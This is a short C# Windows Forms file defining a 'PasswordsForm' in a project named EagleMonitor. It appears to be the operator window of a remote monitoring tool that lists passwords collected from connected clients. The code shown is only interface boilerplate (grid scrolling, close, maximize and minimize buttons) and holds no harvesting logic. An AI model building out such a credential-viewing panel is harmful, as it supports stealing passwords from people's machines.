using EagleMonitor.Controls;
using EagleMonitor.Networking;
using EagleMonitor.Utils;
using System;
using System.Windows.Forms;

namespace EagleMonitor.Forms
{
    public partial class PasswordsForm : FormPattern
    {
        private ClientHandler clientHandler { get; set; }
        internal PasswordsForm(ClientHandler clientHandler)
        {
            this.clientHandler = clientHandler;
            InitializeComponent();
        }

        private void PasswordsForm_Load(object sender, EventArgs e)
        {
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(dataGridView1, guna2VScrollBar1, true);
            Miscellaneous.Enable(this.dataGridView1);
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
    }
}
